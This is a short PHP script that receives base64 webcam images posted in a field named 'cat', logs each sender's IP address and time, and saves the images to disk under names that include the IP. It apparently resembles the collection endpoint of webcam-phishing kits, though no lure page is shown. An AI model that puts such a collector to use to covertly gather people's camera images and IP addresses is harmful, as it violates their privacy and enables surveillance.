/* post.php - Captures images from webcam and logs them */
<?php
$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';
$ipAddress = $_SERVER['REMOTE_ADDR'];

if (!empty($imageData)) {
    error_log("Received image from $ipAddress at $date\r\n", 3, "Log.log");
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $fileName = 'cam_' . $date . '_' . str_replace(' ', '_', $ipAddress) . '.png';
    file_put_contents($fileName, $unencodedData);
}
exit();
?>
